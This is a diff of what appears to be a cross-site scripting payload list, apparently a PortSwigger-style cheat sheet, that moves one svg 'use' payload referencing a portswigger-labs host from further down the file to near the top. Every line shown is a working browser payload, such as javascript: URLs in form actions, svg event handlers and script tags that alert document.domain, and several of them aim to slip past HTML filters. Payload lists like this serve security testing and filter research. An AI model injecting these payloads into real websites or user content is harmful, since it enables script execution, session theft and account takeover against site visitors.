@@ -25,6 +25,7 @@
 <isindex type=submit formaction=javascript:alert(1)>
 <isindex type=submit action=javascript:alert(1)>
 <svg><discard onbegin=alert(1)>
+<svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -1447,7 +1448,6 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <form><button formaction=javascript:alert(1)>XSS
 <form><input type=submit formaction=javascript:alert(1) value=XSS>
 <form action=javascript:alert(1)><input type=submit value=XSS>
-<svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>
 <svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS<\/text><\/a>
 <a href=\"javascript:\/\/%0aalert(1)\">XSS<\/a>
 <script>onerror=alert;throw 1<\/script>
